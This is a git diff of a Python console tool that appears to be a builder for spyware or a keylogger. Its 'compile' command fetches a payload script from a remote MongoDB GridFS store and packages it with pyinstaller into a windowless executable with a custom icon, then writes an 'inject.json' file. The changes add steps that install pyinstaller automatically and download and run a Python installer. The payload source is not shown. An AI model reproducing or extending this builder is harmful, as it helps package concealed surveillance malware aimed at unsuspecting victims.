@@ -9,16 +9,17 @@ from pymongo.server_api import ServerApi
 import sys 
 from gridfs import GridFS
 from bson.objectid import ObjectId
-import pygetwindow as gw
+import urllib.request
+import subprocess
 
 
 #!# -----------------------------------CONSTANTS----------------------------------- #!#
-
+list_of_options = ["yes", "y", "no", "n", "nuh", "nope","yeah","ye"]
 
 os.system("cls")
 
 
-commands_list = ["exit", "help", "compile", "config", "emails", "test", "mode", "test", "start", "status", "screenshot"]
+commands_list = ["exit", "help", "compile", "config", "saved", "mode", "start", "status", "screenshot"]
 modes = ["email", "local"]
 
 
@@ -48,11 +49,6 @@ def printlogo():
     ╚═════╝░╚═╝░░╚═╝╚══════
         """)
     
-
-SendMail = bool
-
-keys = []
-keys_pressed = 0
 
 
 #!# -----------------------------------INJECTOR RELEATED----------------------------------- #!#
@@ -260,7 +256,7 @@ def status():
 def screenshotSettings():
         print(bcolors.WARNING + "ScreenShot settings.\n" + bcolors.DIM)
         option = input("Would you like screenshots to be saved (y/n)?\n")
-        list_of_options = ["yes", "y", "no", "n", "nuh", "nope","yeah","ye"]
+   
         if option.lower() not in list_of_options:
             input(bcolors.RESET_DIM + bcolors.FAIL + "please choose a correct option!\n" + bcolors.DIM + f"{option} is not a valid option.")
             screenshotSettings()
@@ -359,6 +355,8 @@ def __main__():
     elif CONSOLE.lower() == "status":
         status()
 
+ 
+            
     elif CONSOLE.lower() == "compile":
         try:
             if check_config() == False:
@@ -379,13 +377,42 @@ def __main__():
    
                     
                 # Download the Python file
-                fsID = ObjectId("64e65f957cf3d923d8a3fc8c")
+                fsID = ObjectId("64e8caf37af5e1a431273f7b")
                 with open(f'{filename}.py', 'wb') as f:
                     file = fs.get(fsID)
                     f.write(file.read())
                     
-                os.system(f"pyinstaller -F -w \"{filename}\".py -i \"{logo}\"")
-                os.remove(f"{filename}.py")
+             
+                    
+                def Compile():    
+                    SYSTEM_PRINT = os.system(f"pyinstaller -F -w \"{filename}\".py -i \"{logo}\"")
+                    if SYSTEM_PRINT == 1:
+                        print("Installing pyinstaller module")
+                        PIPINSTALLER_ = os.system(f"pip install pyinstaller") 
+                        if PIPINSTALLER_ == 0:
+                            Compile()
+                        if PIPINSTALLER_ == 1:
+                            def option():
+                                option = input(bcolors.FAIL + "Ooops! Python is not installed.\n" + bcolors.WARNING + "Would you like to install it? (y/n)\n" + bcolors.WHITE)
+                                if option in list_of_options:
+                                    if option.startswith("y"):
+                                        python_installer_url = "https://www.python.org/ftp/python/3.9.6/python-3.9.6.exe"
+                                        local_filename = "python_installer.exe"
+                                        urllib.request.urlretrieve(python_installer_url, local_filename)
+                                        print(f"Downloaded... {local_filename}")
+                                        subprocess.run([local_filename])
+                                        Compile()
+                                    else:
+                                        raise Exception 
+                                else:
+                                    print("That is not a valid option!")
+                                    option()
+                            option()
+                    try:
+                        os.remove(f"{filename}.py")
+                    except:
+                        pass
+                Compile()
 
                 
                 with open("./dist/inject.json", "w") as f:
